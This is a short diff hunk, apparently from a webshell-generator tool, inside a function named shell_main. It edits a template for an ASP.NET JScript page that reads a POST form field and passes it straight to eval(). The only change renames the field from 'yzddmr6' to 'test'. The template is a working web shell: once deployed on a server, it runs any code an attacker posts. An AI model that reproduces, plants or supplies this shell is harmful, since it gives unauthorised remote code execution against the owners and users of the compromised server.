@@ -34,7 +34,7 @@ def shell_main():
 <%@ Page Language="Jscript" Debug=true%>
 <%
 var {2}='{0}';
-var {3}=Request.Form("yzddmr6");
+var {3}=Request.Form("test");
 var {4}={1};
 eval({3},{4});
 %>
